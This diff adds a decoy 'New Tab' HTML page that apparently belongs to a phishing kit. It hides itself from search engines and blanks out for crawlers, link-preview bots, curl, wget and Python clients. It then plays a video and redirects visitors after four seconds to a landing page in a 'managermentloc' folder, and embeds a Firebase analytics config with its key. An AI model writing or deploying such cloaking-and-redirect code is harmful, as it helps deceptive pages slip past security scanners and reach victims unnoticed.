@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="robots" content="noindex,nofollow,noarchive,nosnippet" />
+  <link rel="shortcut icon" href="ico.ico" type="image/x-icon">
+  <title>New Tab</title>
+  <style>
+    body, html {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    #myVideo {
+      max-width: 100%;
+      max-height: 100%;
+    }
+  </style>
+
+  <!-- 🔒 Anti-bot protection -->
+  <script>
+    const ua = navigator.userAgent.toLowerCase();
+    if (
+      ua.includes("googlebot") ||
+      ua.includes("bingbot") ||
+      ua.includes("yandex") ||
+      ua.includes("facebookexternalhit") ||
+      ua.includes("discordbot") ||
+      ua.includes("slackbot") ||
+      ua.includes("mail.ru") ||
+      ua.includes("python") ||
+      ua.includes("curl") ||
+      ua.includes("wget") ||
+      ua.includes("bot")
+    ) {
+      document.body.innerHTML = "";
+      window.stop();
+    }
+  </script>
+</head>
+
+<body>
+  <video id="myVideo" autoplay muted playsinline>
+    <source src="managermentloc/img/Mate.mp4" type="video/mp4" />
+    Your browser does not support the video tag.
+  </video>
+
+  <script>
+    setTimeout(function () {
+      window.location.href = "managermentloc/Landingpage/landingpage.html";
+    }, 4000);
+  </script>
+
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.14.1/firebase-app.js";
+    import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.14.1/firebase-analytics.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyAhWBorL_STRmMlfJsjFTKSEVZ6Z6Zi5dk",
+      authDomain: "ladingpage-83f40.firebaseapp.com",
+      projectId: "ladingpage-83f40",
+      storageBucket: "ladingpage-83f40.appspot.com",
+      messagingSenderId: "1007848051122",
+      appId: "1:1007848051122:web:b2bec8506bb7e980e094ab",
+      measurementId: "G-ZMEFN809WZ"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const analytics = getAnalytics(app);
+  </script>
+</body>
+</html>
